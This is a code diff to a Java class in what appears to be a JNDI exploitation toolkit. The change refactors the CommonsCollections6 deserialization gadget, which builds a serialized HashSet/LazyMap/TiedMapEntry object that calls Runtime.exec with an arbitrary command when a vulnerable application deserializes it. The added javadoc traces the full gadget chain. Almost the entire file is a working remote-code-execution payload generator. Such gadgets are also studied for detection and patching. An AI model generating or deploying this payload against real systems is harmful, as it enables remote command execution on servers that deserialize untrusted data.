@@ -2,6 +2,7 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -16,34 +17,36 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
-public class CommonsCollections6 {
+/**
+ * 	Gadget chain:
+ * 	    java.io.ObjectInputStream.readObject()
+ *             java.util.HashSet.readObject()
+ *                 java.util.HashMap.put()
+ *                 java.util.HashMap.hash()
+ *                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+ *                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+ *                         org.apache.commons.collections.map.LazyMap.get()
+ *                             org.apache.commons.collections.functors.ChainedTransformer.transform()
+ *                             org.apache.commons.collections.functors.InvokerTransformer.transform()
+ *                             java.lang.reflect.Method.invoke()
+ *                                 java.lang.Runtime.exec()
+ *
+ *     by @matthias_kaiser
+ */
+public class CommonsCollections6 implements ObjectPayload<Byte> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        final String[] execArgs = new String[]{String.valueOf(type)};
-
-        final Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{
-                        String.class, Class[].class}, new Object[]{
-                        "getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke", new Class[]{
-                        Object.class, Object[].class}, new Object[]{
-                        null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class}, execArgs),
-                new ConstantTransformer(1)};
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
+        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
         Transformer transformerChain = new ChainedTransformer(transformers);
 
         final Map innerMap = new HashMap();
-
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
         HashSet map = new HashSet(1);
-        map.add("foo");
-        Field f;
+        map.add("su18");
+        Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
         } catch (NoSuchFieldException e) {
@@ -53,7 +56,7 @@ public class CommonsCollections6 {
         Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
-        Field f2;
+        Field f2 = null;
         try {
             f2 = HashMap.class.getDeclaredField("table");
         } catch (NoSuchFieldException e) {
@@ -68,7 +71,7 @@ public class CommonsCollections6 {
             node = array[1];
         }
 
-        Field keyField;
+        Field keyField = null;
         try {
             keyField = node.getClass().getDeclaredField("key");
         } catch (Exception e) {
@@ -86,5 +89,10 @@ public class CommonsCollections6 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Byte getObject(String command) throws Exception {
+        return null;
     }
 }
